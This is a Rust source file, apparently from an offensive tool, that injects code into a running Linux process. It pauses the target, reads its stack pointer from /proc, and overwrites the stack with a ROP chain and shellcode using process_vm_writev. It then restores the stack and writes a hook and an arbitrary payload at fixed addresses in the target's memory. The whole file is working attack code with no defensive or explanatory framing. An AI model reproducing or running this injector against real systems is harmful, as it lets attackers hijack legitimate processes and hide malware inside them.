use std::ffi::c_void;
use std::process::exit;
use std::{thread::sleep, time::Duration};

use libc::pid_t;
use libc::{SIGCONT, kill};
use libc::{SIGSTOP, c_ulong, process_vm_readv};
use libc::{iovec, process_vm_writev};

use crate::asm;
use crate::constants::*;

pub fn inject(pid: pid_t, hook_payload: &[u8], payload: &[u8]) {
    println!(
        "Injecting into process {} via process_vm_writev syscall",
        pid
    );

    // Here we also need to read a stack-based shellcode from our assembly buffer
    let stack_shellcode = unsafe {
        std::slice::from_raw_parts(
            asm::stack_shellcode_start as *const u8,
            asm::stack_shellcode_end as *const u8 as usize
                - asm::stack_shellcode_start as *const u8 as usize,
        )
    };

    unsafe {
        println!("Sending SIGSTOP");
        kill(pid, SIGSTOP);
    };

    wait_for_stop(pid);

    let syscall_info = std::fs::read_to_string(format!("/proc/{}/syscall", pid)).unwrap();
    let rsp = &syscall_info
        .lines()
        .next()
        .unwrap()
        .split_ascii_whitespace()
        .nth_back(1)
        .unwrap()
        .split("0x")
        .last()
        .unwrap();

    let rsp = usize::from_str_radix(rsp, 16).unwrap();

    println!("Stack pointer: 0x{:x}", rsp);

    let mut ropchain = asm::ROPCHAIN.to_vec();
    // Add RSP address to the ropchain to make it executable
    ropchain[1] = rsp & PAGE_MASK;

    let mut stack_shellcode = stack_shellcode.to_vec();

    if let Some(pos) = stack_shellcode.windows(8).position(|w| w == [0x41; 8]) {
        stack_shellcode[pos..pos + 8].copy_from_slice(rsp.to_le_bytes().as_slice());
    }

    let mut stack_shellcode = stack_shellcode
        .chunks_exact(8)
        .map(|x| usize::from_le_bytes(<[u8; 8]>::try_from(x).unwrap()))
        .collect::<Vec<usize>>();

    // Restores RSP address after ropchain execution
    ropchain.append(&mut stack_shellcode);

    println!(
        "Backing up stack: {} bytes",
        ropchain.len() * std::mem::size_of::<usize>()
    );
    let mut stack_backup = vec![0u8; ropchain.len() * std::mem::size_of::<usize>()];

    let local_buf = [iovec {
        iov_base: stack_backup.as_mut_ptr() as *mut c_void,
        iov_len: stack_backup.len(),
    }];

    let remote_buf = [iovec {
        iov_base: rsp as *mut c_void,
        iov_len: stack_backup.len(),
    }];

    let result = unsafe {
        process_vm_readv(
            pid,
            local_buf.as_ptr(),
            local_buf.len() as c_ulong,
            remote_buf.as_ptr(),
            remote_buf.len() as c_ulong,
            0,
        )
    };

    if result < 0 {
        let err = std::io::Error::last_os_error();
        eprintln!("process_vm_readv failed: {}", err);
        exit(err.raw_os_error().unwrap())
    }

    let local_buf = [iovec {
        iov_base: ropchain.as_ptr() as *mut c_void,
        iov_len: ropchain.len() * std::mem::size_of::<usize>() as usize,
    }];

    println!("Ropchain: {:x?}", &ropchain,);

    println!("Rewriting stack");
    let result = unsafe {
        process_vm_writev(
            pid,
            &local_buf as *const iovec,
            local_buf.len() as c_ulong,
            &remote_buf as *const iovec,
            remote_buf.len() as c_ulong,
            0,
        )
    };

    println!("{}", result);

    if result < 0 {
        let err = std::io::Error::last_os_error();
        eprintln!("process_vm_writev failed: {}", err);
        exit(err.raw_os_error().unwrap())
    }

    unsafe {
        println!("Sending SIGCONT");
        kill(pid, SIGCONT);
    };

    println!("Wait for process to restart");
    wait_for_continue(pid);

    println!("Waiting for ropchain to execute");
    wait_for_stop(pid);

    println!("Restoring stack");

    // write a leave/ret at the end of the stack backup to return to the original stack
    let hcf_offset = asm::ROPCHAIN.len() * std::mem::size_of::<usize>() as usize
        + (asm::stack_shellcode_end as *const u8 as usize
            - asm::stack_shellcode_start as *const u8 as usize)
        - 2;
    stack_backup[hcf_offset] = 0xc9;
    stack_backup[hcf_offset + 1] = 0xc3;

    let local_buf = [iovec {
        iov_base: stack_backup.as_ptr() as *mut c_void,
        iov_len: stack_backup.len() * std::mem::size_of::<usize>() as usize,
    }];

    let result = unsafe {
        process_vm_writev(
            pid,
            local_buf.as_ptr(),
            local_buf.len() as c_ulong,
            remote_buf.as_ptr(),
            remote_buf.len() as c_ulong,
            0,
        )
    };

    println!("{} bytes written", result);
    println!("{:?}", stack_backup);
    println!("{:?}", ropchain);
    println!("{:?}", local_buf);
    println!("{:?}", remote_buf);

    if result < 0 {
        let err = std::io::Error::last_os_error();
        eprintln!("process_vm_writev failed: {}", err);
        exit(err.raw_os_error().unwrap())
    }

    println!("Write hook");

    let local_buf = [
        iovec {
            iov_base: hook_payload.as_ptr() as *mut c_void,
            iov_len: hook_payload.len(),
        },
        iovec {
            iov_base: payload.as_ptr() as *mut c_void,
            iov_len: payload.len(),
        },
    ];

    let remote_buf = [
        iovec {
            iov_base: HOOK_ADDRESS as *mut c_void,
            iov_len: hook_payload.len(),
        },
        iovec {
            iov_base: PAYLOAD_ADDRESS as *mut c_void,
            iov_len: payload.len(),
        },
    ];

    let result = unsafe {
        process_vm_writev(
            pid,
            local_buf.as_ptr(),
            local_buf.len() as c_ulong,
            remote_buf.as_ptr(),
            remote_buf.len() as c_ulong,
            0,
        )
    };

    if result < 0 {
        let err = std::io::Error::last_os_error();
        eprintln!("process_vm_writev failed: {}", err);
        exit(err.raw_os_error().unwrap())
    };

    unsafe {
        println!("Sending SIGCONT");
        kill(pid, SIGCONT);
    };

    println!("Wait for process to restart");
    wait_for_continue(pid);
}

fn wait_for_stop(pid: pid_t) {
    loop {
        let process_info = std::fs::read_to_string(format!("/proc/{}/status", pid)).unwrap();
        for l in process_info.lines() {
            if l.contains("State:") && l.contains("T ") {
                return;
            }
        }

        println!("Waiting for process to stop...");
        sleep(Duration::from_secs(1));
    }
}

fn wait_for_continue(pid: pid_t) {
    loop {
        let process_info = std::fs::read_to_string(format!("/proc/{}/status", pid)).unwrap();
        for l in process_info.lines() {
            if l.contains("State:") && l.contains("R ") {
                return;
            }
        }

        println!("Waiting for process to start...");
        sleep(Duration::from_secs(1));
    }
}
